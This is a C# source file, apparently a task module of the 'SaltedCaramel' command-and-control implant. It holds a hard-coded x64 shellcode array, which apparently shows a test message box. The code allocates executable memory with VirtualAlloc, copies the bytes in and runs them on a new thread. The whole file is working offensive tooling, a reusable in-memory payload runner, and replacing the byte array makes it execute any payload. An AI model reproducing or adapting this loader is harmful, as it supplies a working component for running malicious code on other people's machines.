﻿using System;
using System.Runtime.InteropServices;

namespace SaltedCaramel.Tasks
{
    public class Shellcode
    {
        public static void Execute(SCTask task)
        {
            if(LoadShellcode())
            {
                task.status = "complete";
                task.message = "Shellcode loaded.";
            }
        }
        public static bool LoadShellcode()
        {
            byte[] shellcode = new byte[294] {
            0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
            0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
            0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,
            0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
            0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,
            0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
            0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,
            0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,
            0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,
            0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
            0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
            0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,
            0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,
            0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
            0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,0xc1,
            0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0xfe,0x00,0x00,0x00,0x3e,0x4c,0x8d,
            0x85,0x10,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
            0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x53,0x68,0x65,
            0x6c,0x6c,0x63,0x6f,0x64,0x65,0x20,0x6c,0x6f,0x61,0x64,0x65,0x64,0x21,0x00,
            0x73,0x63,0x6c,0x6f,0x61,0x64,0x65,0x72,0x00 };

            IntPtr funcAddr = Win32.Kernel32.VirtualAlloc(
                              IntPtr.Zero,                                          //LPVOID lpAddress
                              (ulong)shellcode.Length,                              //SIZE_T dwSize 
                              Win32.Kernel32.AllocationType.Commit,                 //DWORD flAllocationType
                              Win32.Kernel32.MemoryProtection.ExecuteReadWrite);    //DWORD flProtect
            Marshal.Copy(shellcode, 0, funcAddr, shellcode.Length);

            IntPtr hThread = IntPtr.Zero;
            uint threadId = 0;
            IntPtr pinfo = IntPtr.Zero;

            hThread = Win32.Kernel32.CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            Win32.Kernel32.WaitForSingleObject(hThread, 0xFFFFFFFF);
            return true;
        }
    }
}
